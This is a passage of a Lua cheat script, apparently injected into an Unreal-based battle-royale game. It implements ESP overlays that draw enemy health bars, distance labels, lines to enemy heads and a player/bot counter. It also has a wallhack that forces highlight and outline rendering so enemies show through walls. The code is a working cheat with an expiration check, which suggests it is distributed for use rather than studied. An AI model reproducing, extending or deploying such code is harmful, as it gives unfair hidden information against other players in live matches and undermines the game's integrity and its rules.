        local t=(pct-0.50)/0.50
        return (FLinearColor and FLinearColor(1-t,1,0,1)) or {R=1-t,G=1,B=0,A=1}
    end

    function M.Update(key, feetCanvas, headCanvas, pawn, onScreen, isAI)
        if not _G.AK_GetVal or _G.AK_GetVal("ESP_HP") ~= 1 then M.Remove(key) return end
        local data = M.Widgets[key]
        if not onScreen or not feetCanvas or not headCanvas then
            if data then Hide(data.track) Hide(data.fill) Hide(data.outline) end
            return
        end
        local h = feetCanvas.Y - headCanvas.Y
        if h < 10 then if data then Hide(data.track) Hide(data.fill) Hide(data.outline) end return end
        local w = h * (M.BarWidthFactor or 0.40)
        if w < 20 then w = 20 end
        if w > 120 then w = 120 end
        local cx = (headCanvas.X + feetCanvas.X) * 0.5
        local y = headCanvas.Y - 8 - M.BarHeight
        local x = cx - w * 0.5
        local pct = M.GetHealthPct(pawn)
        if not data then
            data = {
                outline = MakeBorder(M.OutlineColor, 2),
                track   = MakeBorder(M.TrackColor,   2),
                fill    = MakeBorder(M.GetHealthColor(pct), 3),
            }
            if not data.outline or not data.track or not data.fill then
                Destroy(data.outline) Destroy(data.track) Destroy(data.fill)
                M.Widgets[key] = nil; return
            end
            M.Widgets[key] = data
        end
        local bh = M.BarHeight
        pcall(function() data.outline.S:SetPosition(FVector2D and FVector2D(x-1, y-1) or {X=x-1,Y=y-1})
            data.outline.S:SetSize(FVector2D and FVector2D(w+2, bh+2) or {X=w+2,Y=bh+2}) end)
        pcall(function() data.track.S:SetPosition(FVector2D and FVector2D(x, y) or {X=x,Y=y})
            data.track.S:SetSize(FVector2D and FVector2D(w, bh) or {X=w,Y=bh}) end)
        pcall(function() data.fill.S:SetPosition(FVector2D and FVector2D(x, y) or {X=x,Y=y})
            data.fill.S:SetSize(FVector2D and FVector2D(math.max(0,w*pct), bh) or {X=math.max(0,w*pct),Y=bh}) end)
        pcall(function() data.fill.W:SetBrushColor(M.GetHealthColor(pct)) end)
        pcall(function() data.outline.W:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible) end)
        pcall(function() data.track.W:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible) end)
        pcall(function() data.fill.W:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible) end)
    end

    function M.Remove(key)
        local d = M.Widgets[key]; if not d then return end
        Destroy(d.outline); Destroy(d.track); Destroy(d.fill)
        M.Widgets[key] = nil
    end

    function M.ClearAll()
        for k in pairs(M.Widgets) do M.Remove(k) end
        M.Widgets = {}
    end
    
    function M.CleanupStale(validKeys)
    local stale = {}
    for k in pairs(M.Widgets) do
        if not validKeys[k] then stale[#stale + 1] = k end
    end
    for _, k in ipairs(stale) do
        M.Remove(k)
    end
end

    _G.ESPHealthRenderer = M
    return M
end)()

-- ============================================================================
-- 7B. DISTANCE LABEL RENDERER (Canvas-based)
-- ============================================================================
local ESPDistanceRenderer = (function()
    local M = {}
    local FVector2D    = _G.FVector2D or import("Vector2D")
    local FLinearColor = _G.FLinearColor or import("LinearColor")

    M.TextColor = (FLinearColor and FLinearColor(1,1,1,0.95)) or {R=1,G=1,B=1,A=0.95}
    M.BGColor   = (FLinearColor and FLinearColor(0.05,0.05,0.05,0.75)) or {R=0.05,G=0.05,B=0.05,A=0.75}
    M.TextHeight = 14.0
    M.TextWidth  = 70.0
    M.Widgets = {}
    M.Canvas = nil

    local function IsValid(o)
        if o==nil or slua==nil or type(slua.isValid)~="function" then return false end
        local ok,v = pcall(slua.isValid,o); return ok and v==true
    end

    function M.InitCanvas(force)
        if not force and M.Canvas and Game:IsValid(M.Canvas) then return true end
        local tools; pcall(function() tools = require("GameLua.Mod.BaseMod.Common.UI.InGameUITools") end)
        if not tools then return false end
        local root; pcall(function() root = tools.GetMainControlBaseUI() end)
        if not root or not Game:IsValid(root) then return false end
        local canvas = root.CanvasPanel_0
        if not canvas or not Game:IsValid(canvas) then canvas = root.CanvasPanel_42 end
        if not canvas or not Game:IsValid(canvas) then return false end
        M.Canvas = canvas
        return true
    end

    local function MakeText()
        if not M.Canvas or not Game:IsValid(M.Canvas) then return nil end
        local bg; pcall(function() bg = CGame:NewObjectFromPath("/Script/UMG.Border", M.Canvas) end)
        local txt; pcall(function() txt = CGame:NewObjectFromPath("/Script/UMG.TextBlock", M.Canvas) end)
        if not bg or not txt or not slua.isValid(bg) or not slua.isValid(txt) then return nil end
        pcall(function()
            bg:SetBrushColor(M.BGColor)
            bg:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
            txt:SetText("--m")
            txt:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
            if txt.SetJustification then txt:SetJustification(1) end
            if txt.Font then local f = txt.Font f.Size = 11 txt:SetFont(f) end
        end)
        local slot; pcall(function()
            slot = M.Canvas:AddChildToCanvas(bg)
            if slot then slot:SetAutoSize(false) slot:SetZOrder(4) end
        end)
        if not slot then pcall(function() bg:ConditionalBeginDestroy() end) return nil end
        local tslot; pcall(function()
            tslot = M.Canvas:AddChildToCanvas(txt)
            if tslot then
                tslot:SetAutoSize(true)
                tslot:SetAlignment(FVector2D and FVector2D(0.5,0.5) or {X=0.5,Y=0.5})
                tslot:SetZOrder(5)
            end
        end)
        if not tslot then pcall(function() bg:ConditionalBeginDestroy() end) return nil end
        return {BG=bg, BGS=slot, TXT=txt, TXTS=tslot, LastText=nil}
    end

    local function Destroy(d)
        if not d then return end
        local bg, txt = d.BG, d.TXT
        d.BG, d.BGS, d.TXT, d.TXTS = nil,nil,nil,nil
        if IsValid(bg) then pcall(function() bg:RemoveFromParent() end) pcall(function() bg:ConditionalBeginDestroy() end) end
        if IsValid(txt) then pcall(function() txt:RemoveFromParent() end) pcall(function() txt:ConditionalBeginDestroy() end) end
    end

    function M.GetDistanceMeters(myLoc, targetLoc)
        if not myLoc or not targetLoc then return nil end
        local dx = (targetLoc.X or 0)-(myLoc.X or 0)
        local dy = (targetLoc.Y or 0)-(myLoc.Y or 0)
        local dz = (targetLoc.Z or 0)-(myLoc.Z or 0)
        return math.sqrt(dx*dx+dy*dy+dz*dz) / 100.0
    end

    function M.Format(m)
        m = tonumber(m); if not m then return "--m" end
        if m < 1000 then return string.format("%dm", math.floor(m+0.5)) end
        return string.format("%.1fkm", m/1000.0)
    end

M._DistUpdateCache = {}
M._DistInterval = 0.15

function M.Update(key, feetCanvas, feetLoc, myLoc, onScreen)
    if not _G.AK_GetVal or _G.AK_GetVal("ESP_MAP") ~= 1 then M.Remove(key) return end
    local d = M.Widgets[key]
    if not onScreen or not feetCanvas or not feetLoc or not myLoc then
        if d then
            pcall(function() d.BG:SetWidgetVisibility(UEnums.ESlateVisibility.Collapsed) end)
            pcall(function() d.TXT:SetWidgetVisibility(UEnums.ESlateVisibility.Collapsed) end)
        end
        return
    end
    if not d then d = MakeText() if not d then return end M.Widgets[key] = d end
    
    -- ✅ Distance text sirf 0.15s me ek baar update
    local now = os.clock()
    local last = M._DistUpdateCache[key] or 0
    if now - last >= M._DistInterval then
        M._DistUpdateCache[key] = now
        local meters = M.GetDistanceMeters(myLoc, feetLoc)
        local txt = M.Format(meters)
        if d.LastText ~= txt then
            pcall(function() d.TXT:SetText(txt) end)
            d.LastText = txt
        end
    end
        local y = feetCanvas.Y + 4
        local x = feetCanvas.X - M.TextWidth*0.5
        pcall(function() d.BGS:SetPosition(FVector2D and FVector2D(x, y) or {X=x,Y=y})
            d.BGS:SetSize(FVector2D and FVector2D(M.TextWidth, M.TextHeight) or {X=M.TextWidth,Y=M.TextHeight}) end)
        pcall(function() d.TXTS:SetPosition(FVector2D and FVector2D(x+M.TextWidth*0.5, y+M.TextHeight*0.5) or {X=x+M.TextWidth*0.5,Y=y+M.TextHeight*0.5}) end)
        pcall(function() d.BG:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible) end)
        pcall(function() d.TXT:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible) end)
    end

    function M.Remove(key)
        local d = M.Widgets[key]; if not d then return end
        Destroy(d); M.Widgets[key] = nil
        if M._DistUpdateCache then M._DistUpdateCache[key] = nil end
    end

    function M.ClearAll()
        for k in pairs(M.Widgets) do M.Remove(k) end
        M.Widgets = {}
    end
    
    function M.CleanupStale(validKeys)
    local stale = {}
    for k in pairs(M.Widgets) do
        if not validKeys[k] then stale[#stale + 1] = k end
    end
    for _, k in ipairs(stale) do
        M.Remove(k)
    end
end

    _G.ESPDistanceRenderer = M
    return M
end)()

-- ============================================================================
-- 7C. ESP HEAD LINE RENDERER (Canvas-based, top-center → enemy head)
-- ============================================================================
local ESPLineRenderer = (function()
    local M = {}
    local FLinearColor = _G.FLinearColor or import("LinearColor")

    M.Thickness = 1.5
    M.Lines = {}
    M.RealColor = (FLinearColor and FLinearColor(1.0, 0.15, 0.15, 0.92)) or {R=1.0, G=0.15, B=0.15, A=0.92}
    M.BotColor  = (FLinearColor and FLinearColor(0.0, 1.0, 1.0, 0.92)) or {R=0.0, G=1.0, B=1.0, A=0.92}

    local function WValid(w)
        if not w then return false end
        local ok, v = pcall(function() return slua.isValid(w) end)
        return ok and v == true
    end

    function M.Remove(key)
        local ld = M.Lines[key]
        if not ld then return end
        M.Lines[key] = nil
        if WValid(ld.Widget) then
            pcall(function() ld.Widget:RemoveFromParent() end)
            pcall(function() ld.Widget:ConditionalBeginDestroy() end)
        end
    end

    function M.ClearAll()
        for k in pairs(M.Lines) do M.Remove(k) end
        M.Lines = {}
    end

            function M.Update(key, headCanvas, topOriginCanvas, onScreen, isAI, isDead)
        if not _G.AK_GetVal or _G.AK_GetVal("ESP_LINE") ~= 1 then
            M.Remove(key); return
        end
        if isDead == true then
            M.Remove(key); return
        end
        if not onScreen then M.Remove(key); return end
        if not headCanvas or not topOriginCanvas then M.Remove(key); return end

        local hx, hy = headCanvas.X, headCanvas.Y
        local ox, oy = topOriginCanvas.X, topOriginCanvas.Y

        if type(hx) ~= "number" or type(hy) ~= "number"
            or hx ~= hx or hy ~= hy
            or hx < -5000 or hx > 5000
            or hy < -5000 or hy > 5000 then
            M.Remove(key); return
        end
        if type(ox) ~= "number" or type(oy) ~= "number"
            or ox ~= ox or oy ~= oy
            or ox < -5000 or ox > 5000
            or oy < -5000 or oy > 5000 then
            M.Remove(key); return
        end

        local ddx, ddy = hx - ox, hy - oy
        if math.sqrt(ddx*ddx + ddy*ddy) < 5 then
            M.Remove(key); return
        end

        local ld = M.Lines[key]
        if not ld then
            ld = ESPBoxRenderer.CreateLineWidget(
                isAI and M.BotColor or M.RealColor, 1)
            if not ld then return end
            ld._colorKey = isAI and "BOT" or "REAL"
            M.Lines[key] = ld
        end
        local newKey = isAI and "BOT" or "REAL"
        if ld._colorKey ~= newKey then
            local c = isAI and M.BotColor or M.RealColor
            pcall(function() ld.Widget:SetBrushColor(c) end)
            ld._colorKey = newKey
        end
        ESPBoxRenderer.DrawLine(ld, ox, oy, hx, hy, M.Thickness)
    end
    
    function M.CleanupStale(validKeys)
    local stale = {}
    for k in pairs(M.Lines) do
        if not validKeys[k] then stale[#stale + 1] = k end
    end
    for _, k in ipairs(stale) do
        M.Remove(k)
    end
end

    _G.ESPLineRenderer = M
    return M
end)()

-- ============================================================================
-- 7E. NATIVE HP + NAME ESP RENDERER (from BRPlayerCharacterBase.lua)
-- ============================================================================
local NativeHPNameRenderer = (function()
    local M = {}
    
    M.C_BLUE_TEXT = {R=0, G=200, B=255, A=255}
    M.C_CYAN = {R=0, G=255, B=255, A=255}
    M.C_YELLOW = {R=255, G=255, B=0, A=255}
    
    M.Cached_MyHUD = nil
    M._LastHUDCheck = 0
    
    local function IsValid(o)
        if o == nil or slua == nil or type(slua.isValid) ~= "function" then return false end
        local ok, v = pcall(slua.isValid, o)
        return ok and v == true
    end
    
    function M.GetHUD(pc)
        local now = os.clock()
        if M.Cached_MyHUD and IsValid(M.Cached_MyHUD) then
            return M.Cached_MyHUD
        end
        if now - M._LastHUDCheck < 1.0 then
            return nil
        end
        M._LastHUDCheck = now
        pcall(function()
            if IsValid(pc) and pc.MyHUD then
                M.Cached_MyHUD = pc.MyHUD
            end
        end)
        return M.Cached_MyHUD
    end
    
    -- ✅ Native HP + Name + Distance ESP (from BRPlayerCharacterBase)
    -- ✅ Per-enemy throttle (0.2s per enemy)
function M.Update(key, enemy, localPlayer, pc, isBot, distM)
    if not _G.AK_GetVal or _G.AK_GetVal("EspNameHP") ~= 1 then return end
    
    -- Per-enemy cache
    M._HPUpdateCache = M._HPUpdateCache or {}
    local now = os.clock()
    local last = M._HPUpdateCache[key] or 0
    if now - last < 0.2 then return end
    M._HPUpdateCache[key] = now
    
    local hud = M.GetHUD(pc)
    if not IsValid(hud) then return end
    if not IsValid(enemy) or not IsValid(localPlayer) then return end
        
        -- ✅ Name + HP (marker 1006)
        pcall(function()
            if not enemy.bHasAKNativeHPBar then
                local InGameMarkTools = require("GameLua.Mod.BaseMod.Common.InGameMarkTools")
                if InGameMarkTools and InGameMarkTools.ClientAddMapMark then
                    enemy.NativeHPBarMark = InGameMarkTools.ClientAddMapMark(
                        1006, FVector(0,0,0), 0, "", 4, enemy)
                    enemy.bHasAKNativeHPBar = true
                end
            end
        end)
        
        -- ✅ Distance text (blue color)
        if distM and distM <= 400 then
            pcall(function()
                if IsValid(hud) and hud.AddDebugText then
                    local dynamicScale = math.max(0.55, 0.95 - (distM / 400))
                    hud:AddDebugText(
                        string.format("[%dm]", math.floor(distM)),
                        enemy, 0.06,
                        {X=0, Y=115, Z=20}, {X=0, Y=115, Z=20},
                        M.C_BLUE_TEXT, true, false, true, nil,
                        dynamicScale * 1.5, true)
                end
            end)
        end
    end
    
    function M.Remove(key, enemy)
        if enemy and IsValid(enemy) then
            pcall(function()
                if enemy.bHasAKNativeHPBar and enemy.NativeHPBarMark then
                    local InGameMarkTools = require("GameLua.Mod.BaseMod.Common.InGameMarkTools")
                    if InGameMarkTools and InGameMarkTools.ClientRemoveMapMark then
                        InGameMarkTools.ClientRemoveMapMark(enemy.NativeHPBarMark)
                    end
                    enemy.NativeHPBarMark = nil
                    enemy.bHasAKNativeHPBar = false
                end
            end)
        end
    end
    
    function M.ClearAll()
        M.Cached_MyHUD = nil
    end
    
    _G.NativeHPNameRenderer = M
    return M
end)()

-- ============================================================================
-- 7D. ENEMY / BOT COUNTER OVERLAY (Canvas-based, top-center)
-- ============================================================================
local EnemyCounterOverlay = (function()
    local M = {}
    local FVector2D    = _G.FVector2D or import("Vector2D")
    local FLinearColor = _G.FLinearColor or import("LinearColor")
    local WidgetLayoutLibrary = nil
    pcall(function() WidgetLayoutLibrary = import("WidgetLayoutLibrary") end)

    M.Width, M.Height = 240.0, 26.0
    M.OffsetY = 50.0
    M.FontSize = 12
    M.PlayerBG = (FLinearColor and FLinearColor(0.85, 0.05, 0.05, 0.96)) or {R=0.85,G=0.05,B=0.05,A=0.96}
    M.BotBG    = (FLinearColor and FLinearColor(0.0, 1.0, 1.0, 0.96)) or {R=0.0,G=1.0,B=1.0,A=0.96}
    M.PlayerTextColor = (FLinearColor and FLinearColor(0.0, 1.0, 1.0, 1.0)) or {R=0.0,G=1.0,B=1.0,A=1.0}
    M.BotTextColor    = (FLinearColor and FLinearColor(0.0, 0.0, 0.0, 1.0)) or {R=0.0,G=0.0,B=0.0,A=1.0}
    M.Container, M.Slot = nil, nil
    M.PlayerBGWidget, M.BotBGWidget = nil, nil
    M.PlayerText, M.BotText = nil, nil
    M._LastPlayers, M._LastBots = -1, -1
    M._LastX, M._LastY = nil, nil

    local function WValid(w)
        if not w then return false end
        local ok, v = pcall(function() return slua.isValid(w) end)
        return ok and v == true
    end

    function M.Create()
        if M.Container and WValid(M.Container) then return true end
        if not ESPBoxRenderer or not ESPBoxRenderer.InitESPCanvas then return false end
        if not ESPBoxRenderer.InitESPCanvas() then return false end
        local parent = ESPBoxRenderer.ESPCanvas
        if not parent or not WValid(parent) then return false end

        local c, pbg, bbg, pt, bt
        pcall(function() c   = CGame:NewObjectFromPath("/Script/UMG.CanvasPanel", parent) end)
        if not c or not WValid(c) then return false end
        pcall(function() pbg = CGame:NewObjectFromPath("/Script/UMG.Border", c) end)
        pcall(function() bbg = CGame:NewObjectFromPath("/Script/UMG.Border", c) end)
        pcall(function() pt  = CGame:NewObjectFromPath("/Script/UMG.TextBlock", c) end)
        pcall(function() bt  = CGame:NewObjectFromPath("/Script/UMG.TextBlock", c) end)
        if not pbg or not bbg or not pt or not bt then
            pcall(function() c:ConditionalBeginDestroy() end)
            return false
        end

        local halfW = M.Width * 0.5
        local ok = pcall(function()
            pbg:SetBrushColor(M.PlayerBG)
            pbg:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
            bbg:SetBrushColor(M.BotBG)
            bbg:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)

            local ps = c:AddChildToCanvas(pbg)
            ps:SetAutoSize(false)
            ps:SetPosition(FVector2D and FVector2D(0,0) or {X=0,Y=0})
            ps:SetSize(FVector2D and FVector2D(halfW, M.Height) or {X=halfW,Y=M.Height})
            ps:SetZOrder(0)
            local bs = c:AddChildToCanvas(bbg)
            bs:SetAutoSize(false)
            bs:SetPosition(FVector2D and FVector2D(halfW,0) or {X=halfW,Y=0})
            bs:SetSize(FVector2D and FVector2D(halfW, M.Height) or {X=halfW,Y=M.Height})
            bs:SetZOrder(0)

            pt:SetText("PLAYER: 0")
            bt:SetText("BOT: 0")
            pt:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
            bt:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
            if pt.SetJustification then pt:SetJustification(1) end
            if bt.SetJustification then bt:SetJustification(1) end
            if pt.Font then local f=pt.Font f.Size=M.FontSize pt:SetFont(f) end
            if bt.Font then local f=bt.Font f.Size=M.FontSize bt:SetFont(f) end

            local pts = c:AddChildToCanvas(pt)
            pts:SetAutoSize(true)
            pts:SetAlignment(FVector2D and FVector2D(0.5,0.5) or {X=0.5,Y=0.5})
            pts:SetPosition(FVector2D and FVector2D(halfW*0.5, M.Height*0.5) or {X=halfW*0.5,Y=M.Height*0.5})
            pts:SetZOrder(2)
            local bts = c:AddChildToCanvas(bt)
            bts:SetAutoSize(true)
            bts:SetAlignment(FVector2D and FVector2D(0.5,0.5) or {X=0.5,Y=0.5})
            bts:SetPosition(FVector2D and FVector2D(halfW+halfW*0.5, M.Height*0.5) or {X=halfW+halfW*0.5,Y=M.Height*0.5})
            bts:SetZOrder(2)

            local slot = parent:AddChildToCanvas(c)
            slot:SetAutoSize(false)
            slot:SetSize(FVector2D and FVector2D(M.Width, M.Height) or {X=M.Width,Y=M.Height})
            slot:SetZOrder(50)
            M.Slot = slot
        end)
        if not ok then
            pcall(function() c:ConditionalBeginDestroy() end)
            return false
        end

        M.Container, M.PlayerBGWidget, M.BotBGWidget = c, pbg, bbg
        M.PlayerText, M.BotText = pt, bt
        M._LastPlayers, M._LastBots = -1, -1
        M._LastX, M._LastY = nil, nil

        pcall(function()
            local SlateColor
            pcall(function() SlateColor = import("SlateColor") end)
            if SlateColor then
                pt:SetColorAndOpacity(SlateColor(M.PlayerTextColor))
                bt:SetColorAndOpacity(SlateColor(M.BotTextColor))
            else
                pt:SetColorAndOpacity(M.PlayerTextColor)
                bt:SetColorAndOpacity(M.BotTextColor)
            end
        end)
        return true
    end

    function M.SetCounts(realCount, botCount)
        realCount = tonumber(realCount) or 0
        botCount  = tonumber(botCount)  or 0
        if M._LastPlayers ~= realCount and WValid(M.PlayerText) then
            local ok = pcall(function()
                return M.PlayerText:SetText(string.format("PLAYER: %d", realCount)) ~= false
            end)
            if ok then M._LastPlayers = realCount end
        end
        if M._LastBots ~= botCount and WValid(M.BotText) then
            local ok = pcall(function()
                return M.BotText:SetText(string.format("BOT: %d", botCount)) ~= false
            end)
            if ok then M._LastBots = botCount end
        end
    end

    function M.UpdatePosition(pc)
        if not M.Slot or not WValid(M.Slot) then return end
        if not pc or not ESPBoxRenderer.IsValid(pc) then return end

        local vw, vh = nil, nil
        pcall(function()
            local s = FVector2D and FVector2D(0,0) or {X=0,Y=0}
            pc:GetViewportSize(s)
            if s and s.X and s.X > 200 then vw, vh = s.X, s.Y end
        end)
        if not vw then
            pcall(function()
                if WidgetLayoutLibrary and WidgetLayoutLibrary.GetViewportSize then
                    local s = WidgetLayoutLibrary.GetViewportSize(pc)
                    if s and s.X and s.X > 200 then vw, vh = s.X, s.Y end
                end
            end)
        end
        if not vw then vw, vh = 1920, 1080 end

        local sx = ESPBoxRenderer._CanvasScaleX or 1.0
        local sy = ESPBoxRenderer._CanvasScaleY or 1.0
        local ox = ESPBoxRenderer._CanvasOffsetX or 0
        local oy = ESPBoxRenderer._CanvasOffsetY or 0
        local x = (vw * 0.5) * sx + ox - M.Width * 0.5
        local y = M.OffsetY * sy + oy
        if M._LastX and M._LastY
            and math.abs(M._LastX - x) < 0.1 and math.abs(M._LastY - y) < 0.1 then
            return
        end
        pcall(function()
            M.Slot:SetPosition(FVector2D and FVector2D(x,y) or {X=x,Y=y})
        end)
        M._LastX, M._LastY = x, y
    end

    function M.Hide()
        if WValid(M.Container) then
            pcall(function()
                M.Container:SetWidgetVisibility(UEnums.ESlateVisibility.Collapsed)
            end)
        end
    end

    function M.Destroy()
        local c = M.Container
        M.Container, M.Slot = nil, nil
        M.PlayerBGWidget, M.BotBGWidget = nil, nil
        M.PlayerText, M.BotText = nil, nil
        M._LastPlayers, M._LastBots = -1, -1
        M._LastX, M._LastY = nil, nil
        if WValid(c) then
            pcall(function() c:RemoveFromParent() end)
            pcall(function() c:ConditionalBeginDestroy() end)
        end
    end

    _G.EnemyCounterOverlay = M
    return M
end)()

-- ============================================================================
-- 8. WALLHACK RENDERER  (0.5s timer)  (unchanged)
-- ============================================================================
local WallhackRenderer = (function()
    local M = {}
    local FLinearColor = _G.FLinearColor or import("LinearColor")

    M.ConsoleReady = false
    M.ProcessedPawns  = {}
    M.ProcessedMeshes = setmetatable({}, {__mode = "k"})
    M.Timer, M.TimerOwner, M.Active = nil, nil, false
    M.TickInterval = 0.5
    M.AvatarSlots = {0,1,2,3,4,5,6,7}
    M._LastWorld = nil

    M.Colors = {
        RealVisible  = FLinearColor and FLinearColor(0, 100, 0, 100) or {R=0, G=100, B=0, A=100},
        RealOccluded = FLinearColor and FLinearColor(100, 0, 0, 100) or {R=100, G=0, B=0, A=100},
        BotVisible = FLinearColor and FLinearColor(100, 100, 100, 100) or {R=100, G=100, B=100, A=100},
        BotOccluded = FLinearColor and FLinearColor(100, 100, 0, 100) or {R=100, G=100, B=0, A=100},
    }

    local function SetupConsole()
        if M.ConsoleReady then return true end
        local ok = false
        pcall(function()
            local KSL   = import("KismetSystemLibrary")
            local world = slua.getWorld()
            if not KSL or not world then return end
            KSL.ExecuteConsoleCommand(world, "r.EnableDrawDyeingColor 1")
            KSL.ExecuteConsoleCommand(world, "r.CustomDepth 3")
            KSL.ExecuteConsoleCommand(world, "r.IdeaOutline.Enable 1")
            KSL.ExecuteConsoleCommand(world, "r.Highlight.Enable 1")
            ok = true
        end)
        M.ConsoleReady = ok
        return ok
    end

    local function ApplyToMesh(mesh, visColor, occColor)
        if not mesh or not slua.isValid(mesh) then return end
        if M.ProcessedMeshes[mesh] then return end
        pcall(function()
            mesh:SetDrawDyeing(true)
            mesh:SetDrawDyeingMode(1)
            mesh:SetVisibleDyeingColor(visColor)
            mesh:SetOccludedDyeingColor(occColor)
            mesh:SetDyeingColorFadeDistance(99999.0)
            mesh:SetDyeingColorMinMaxDistance(0.0, 99999.0)
            mesh:SetDrawHighlight(true)
            mesh:OverrideHighlightColor(visColor)
            mesh:SetHighlightCanBeOccluded(false)
            mesh:SetDrawIdeaOutline(true)
            mesh:SetIdeaOutlineNew(true)
            mesh:SetIdeaOutlineOcclusionHighlight(true)
            mesh:OverrideIdeaOutlineColor(visColor)
            mesh:SetIdeaOutlineOcclusionColor(occColor)
            mesh:OverrideIdeaOutlineThickness(20.0)
            mesh:SetIdeaOverrideOutlineAndOcclusion(true)
            mesh:SetRenderCustomDepth(true)
            mesh:SetCustomDepthStencilValue(255)
        end)
        M.ProcessedMeshes[mesh] = true
    end

    local function ClearMesh(mesh)
        if not mesh or not slua.isValid(mesh) then return end
        pcall(function()
            mesh:SetDrawDyeing(false)
            mesh:SetDrawHighlight(false)
            mesh:SetDrawIdeaOutline(false)
            mesh:SetRenderCustomDepth(false)
        end)
        M.ProcessedMeshes[mesh] = nil
    end

    local function CollectAllMeshes(pawn)
        local meshes = {}
        if slua.isValid(pawn.Mesh) then table.insert(meshes, pawn.Mesh) end
        local avatarComp = pawn.CharacterAvatarComp2_BP
            or (pawn.getAvatarComponent2 and pawn:getAvatarComponent2())
        if avatarComp and avatarComp.GetMeshCompBySlot then
            for _, slot in ipairs(M.AvatarSlots) do
                local mesh = avatarComp:GetMeshCompBySlot(slot)
                if slua.isValid(mesh) then table.insert(meshes, mesh) end
            end
        end
        pcall(function()
            local SK = import("SkeletalMeshComponent")
            if SK then
                local comps = pawn:GetComponentsByClass(SK)
                if comps then
                    for i = 0, comps:Num() - 1 do
                        local comp = comps:Get(i)
                        if slua.isValid(comp) and comp ~= pawn.Mesh then
                            table.insert(meshes, comp)
                        end
                    end
                end
            end
        end)
        pcall(function()
            local ST = import("StaticMeshComponent")
            if ST then
                local comps = pawn:GetComponentsByClass(ST)
                if comps then
                    for i = 0, comps:Num() - 1 do
                        local comp = comps:Get(i)
                        if slua.isValid(comp) then table.insert(meshes, comp) end
                    end
                end
            end
        end)
        local weapon = pawn.GetCurrentWeapon and pawn:GetCurrentWeapon()
        if slua.isValid(weapon) and slua.isValid(weapon.Mesh) then
            table.insert(meshes, weapon.Mesh)
        end
        return meshes
    end

    local function ClearAllProcessed()
        for mesh in pairs(M.ProcessedMeshes) do ClearMesh(mesh) end
        M.ProcessedMeshes = setmetatable({}, {__mode = "k"})
        M.ProcessedPawns = {}
    end

    local function Tick()
        if not M.Active then return end
        if not CheckExpiration() then return end
        if not _G.AK_GetVal or _G.AK_GetVal("ESP_WALLHACK") ~= 1 then return end

        local world = nil
        pcall(function() world = slua and slua.getWorld and slua.getWorld() end)
        if world ~= M._LastWorld then
            M._LastWorld = world
            ClearAllProcessed()
            M.ConsoleReady = false
        end

        pcall(function()
            local localPawn = GameplayData.GetPlayerCharacter()
            if not slua.isValid(localPawn) then return end
            if not SetupConsole() then return end

            local myTeamId = localPawn.TeamID or 0
            local allPawns = Game:GetAllPlayerPawns() or {}

            for key, data in pairs(M.ProcessedPawns) do
                local pawn = data.pawn
                if not slua.isValid(pawn) then
                    M.ProcessedPawns[key] = nil
                else
                    local dead = false
                    pcall(function()
                        if pawn:IsDead() or pawn.bIsDead or pawn.bHidden
                            or (pawn.Mesh and pawn.Mesh.bHidden) then
                            dead = true
                        end
                    end)
                    if dead then M.ProcessedPawns[key] = nil end
                end
            end

            for _, pawn in pairs(allPawns) do
                if slua.isValid(pawn) and pawn ~= localPawn
                    and (pawn.TeamID == nil or pawn.TeamID ~= myTeamId) then
                    local alive = true
                    pcall(function()
                        if pawn.Health and pawn.Health <= 0 then alive = false end
                        if pawn:IsDead() or pawn.bIsDead then alive = false end
                    end)
                    if alive then
                        local key = tostring(pawn.PlayerKey or pawn)
                        if not M.ProcessedPawns[key] then
                            M.ProcessedPawns[key] = {pawn = pawn}
                        end
                        local isAI = ESPBoxRenderer and ESPBoxRenderer.IsAI(pawn, key) or false
                        local vis = isAI and M.Colors.BotVisible or M.Colors.RealVisible
                        local occ = isAI and M.Colors.BotOccluded or M.Colors.RealOccluded
                        local meshes = CollectAllMeshes(pawn)
                        for _, m in ipairs(meshes) do
                            ApplyToMesh(m, vis, occ)
                        end
                    end
                end
            end
        end)
    end

    function M.Start()
        if M.Active then return true end
        local owner = nil
        pcall(function()
            if GameplayData and GameplayData.GetPlayerController then
                owner = GameplayData.GetPlayerController()
            end
        end)
        if not owner or type(owner.AddGameTimer) ~= "function" then return false end
        M.Active = true
        local ok, timer = pcall(function()
            return owner:AddGameTimer(M.TickInterval, true, Tick)
        end)
        if not ok or not timer then M.Active = false; return false end
        M.Timer, M.TimerOwner = timer, owner
        pcall(Tick)
        print("[Wallhack] Started at 0.5s")
        return true
    end

    function M.Stop()
        M.Active = false
        if M.Timer and M.TimerOwner
            and type(M.TimerOwner.RemoveGameTimer) == "function" then
            pcall(function() M.TimerOwner:RemoveGameTimer(M.Timer) end)
        end
        M.Timer, M.TimerOwner = nil, nil
        ClearAllProcessed()
        M.ConsoleReady = false
    end

    function M.IsActive() return M.Active end
    _G.WallhackRenderer = M
    return M
end)()

-- ============================================================================
-- 9. DISTANCE MARKER & MINI-MAP ESP (native — kept as secondary path)
-- ============================================================================
local distanceMarkerConfig = {
    UIPathName = "/Game/Mod/EvoBase/BluePrints/UIBP/QuickSign/QuickSign_TipHitEnemy_UIBP_New.QuickSign_TipHitEnemy_UIBP_New_C",
    MaxWidgetNum = 99, MaxShowDistance = 6000000,
    bBindOutScreen = true, bBindBlocked = true, bIsBindingActor = true,
    BindSocketName = "head", bUseLuaWorldSocketName = true,
    WorldPositionOffset = FVector(0, 0, 50), bNeedPreLoad = true, Priority = 2
}

local function InitDistanceMarkerSystem()
    pcall(function()
        if InGameMarkTools and InGameMarkTools.ScreenMarkManager
            and InGameMarkTools.ScreenMarkManager.OnInitMarkGroupData then
            InGameMarkTools.ScreenMarkManager:OnInitMarkGroupData(9999)
        end
        local gameplayTools = require("GameLua.Mod.BaseMod.Common.GamePlayTools")
        local smc = gameplayTools.GetCurrentConfig("ScreenMarkConfig")
        if smc then
            if not smc[1006] then
                smc[1006] = {
